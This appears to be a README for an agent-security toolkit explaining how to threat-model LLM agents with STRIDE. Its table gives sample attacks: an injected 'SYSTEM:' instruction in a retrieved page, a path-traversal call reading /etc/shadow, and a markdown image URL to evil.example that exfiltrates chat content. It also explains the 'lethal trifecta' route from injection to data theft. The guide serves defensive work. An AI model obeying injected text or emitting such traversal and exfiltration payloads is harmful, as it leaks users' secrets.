# Threat modeling LLM agents with STRIDE

STRIDE works on agents, but the interesting threats sit in places classic diagrams do not draw: the model itself is a component that *follows instructions found in data*, tools turn text into side effects, and retrieved content is a second input channel that the user never sees.

This directory has two ways to do it:

1. **Generate** a first draft from a YAML system description: `agentsec threatmodel render`. See the worked example, [EXAMPLE-support-copilot.md](EXAMPLE-support-copilot.md).
2. **Fill in by hand** with the [blank template](TEMPLATE.md) if you would rather run a whiteboard session.

Both use the same catalog ([`threats.yaml`](../../src/agentsec/threatmodel/data/threats.yaml), 25 threats, each mapped to the OWASP LLM Top 10, the OWASP Top 10 for Agentic Applications and MITRE ATLAS; see the [framework crosswalk](frameworks.md)). It is a *candidate list*: the value is in the team confirming or dismissing each threat for their system and recording why.

## How STRIDE maps to agents

| Category | What it means for an agent | Typical example |
|---|---|---|
| **S**poofing | Untrusted text passes as a trusted instruction source; peer agents / MCP servers / tool descriptions are not authenticated; the agent acts as itself instead of as the user | A retrieved web page contains "SYSTEM: ..." and the model obeys |
| **T**ampering | Poisoned retrieval or memory; manipulated tool arguments (traversal, SSRF, injection); unvalidated model output feeding a shell, SQL or HTML renderer; tampered model artifacts | `read_file(path="../../etc/shadow")` |
| **R**epudiation | No attributable record of prompt, retrieved content, model version, tool call and approval; approvals rubber-stamped | "Who authorised that refund?" and the log says only `tool ok` |
| **I**nformation disclosure | Exfiltration through rendered markup or tool calls; system prompt or secrets extracted; cross-tenant retrieval; secrets in logs and traces | `![](https://evil.example/p.png?d=<chat>)` auto-fetched by the UI |
| **D**enial of service | Unbounded tokens, loops, cost; resource-hungry tools; approval-channel flooding | Recursive "keep researching" with no step cap |
| **E**levation of privilege | Excessive agency; injection chained to a privileged action (data + untrusted input + outbound channel); sandbox escape; jailbreaks; over-broad secret access | Summariser that can also send mail and delete files |

## The system description

```yaml
name: My Agent
components:
  - {id: ui,  name: Chat UI,   type: user_interface, trust_zone: internet}
  - {id: kb,  name: KB index,  type: retrieval_store, trust_zone: app, ingests_untrusted: true}
  - {id: mail, name: Mailer,   type: tool, trust_zone: app, side_effects: true, privileges: send as user}
data_flows:
  - {from: ui, to: kb, data: query}
```

**Component types:** `user_interface`, `orchestrator`, `llm`, `tool`, `retrieval_store`, `memory`, `external_agent`, `code_executor`, `secrets_store`, `model_artifact`.

**Flags that raise the triage hint:** `ingests_untrusted` (anything an outsider can write into), `side_effects` (writes, sends, deletes, spends, or egresses data), `holds_sensitive_data`, and `privileges`.

**Trust zones** are free-form labels. A data flow whose endpoints are in different zones is drawn dashed and listed under *Trust-boundary crossings*. Treat everything that crosses a boundary inbound as untrusted, including content from your own knowledge base if outsiders can edit it.

## Running a session

1. Draw or list components, and mark where untrusted content enters and where side effects leave.
2. Generate the draft. For each threat row decide **mitigate / accept / transfer / not applicable**, and set **L**ikelihood and **I**mpact using your organisation's scale. The generator's *priority hint* is only a starting point.
3. For each *mitigate*, name the control and an owner. Where the toolkit has a matching control the register points to it.
4. Verify with the fuzzer: `agentsec fuzz --target <your agent> --max-asr 0.05`. The verification section lists the categories relevant to your components.
5. Record residual risk and decisions, commit the document, and re-run when components, tools or data sources change.

## Look for the "lethal trifecta" first

For each session ask whether the agent combines all three of: **access to private data**, **exposure to untrusted content**, and **a way to communicate externally** (email, HTTP, rendered links, file writes that sync). If yes, one injection can read secrets and send them out with no code vulnerability at all. Remove one leg, or use taint tracking (`agentsec.sandbox.TaintPolicy`) so that once untrusted content is read, outbound tools are denied or need approval. Threat `AG-E-02` covers this.
